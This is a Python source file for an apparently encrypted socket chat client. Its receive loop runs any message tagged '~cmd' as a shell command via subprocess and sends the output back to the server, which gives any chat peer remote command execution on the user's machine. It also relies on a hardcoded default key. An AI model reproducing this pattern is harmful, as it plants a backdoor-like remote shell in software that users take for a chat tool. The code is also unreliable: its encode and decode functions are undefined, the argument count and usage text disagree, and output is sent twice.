import socket
import subprocess
import threading
import sys
import base64
from Crypto.Cipher import AES
import Crypto.Util.Padding
import Crypto.Random
from Cryptor import Cryptor

###################### FUNKTIOT #############################

def receive():
    while True:
        try:
            message = client.recv(1024)
            nickTest = message.decode('UTF-8')
            if nickTest == 'NICK':
                client.send(nickname.encode('UTF-8'))
                pass
            else:
                try:
                    # FAILS, IF MESSAGE COMES FROM SERVER
                    message = decode(message)
                    message_list = message.split()
                    if message_list[1] == "~cmd":
                        cmd(message_list)
                    else:
                        print(message)

                except:
                    # IF MESSAGE COMES FROM THE SERVER
                    message = message.decode('UTF-8')
                    print(message)

        except:
            print("Receive function failed")
            client.close()
            break

def write():
    while True:
        message_input = input("")
        if len(message_input) == 0:
            pass
        else:
            message = f'{nickname}: {message_input}'
            message = encode(message)
            client.send(message)


def cmd(commands):

    del commands[0:2]
    commands_str = " ".join(commands)

    try:
        output = subprocess.getoutput(commands_str)
    except Exception as e:
        print("Subprocess failed")
        print(e)
        return
    output = f'{nickname}: {output}'
    try:
        output_encoded = encode(output)
        client.send(output_encoded)
    except Exception as e:
        print("Failed to encode")
        print(e)
        return
    client.send(output_encoded)




########################### MAIN ####################################

if len(sys.argv) != 4:
    print("Correct usage: script, IP address, port number, key, nickname")
    exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])
nickname = str(sys.argv[3])

key = input("Give key in 16 characters, else the default key will be used: ")
default_key = "abcdefghijklmnop"
if len(key) == 0:
    key = default_key
key = key.encode('UTF-8')

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
print("Connected to host")


receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()

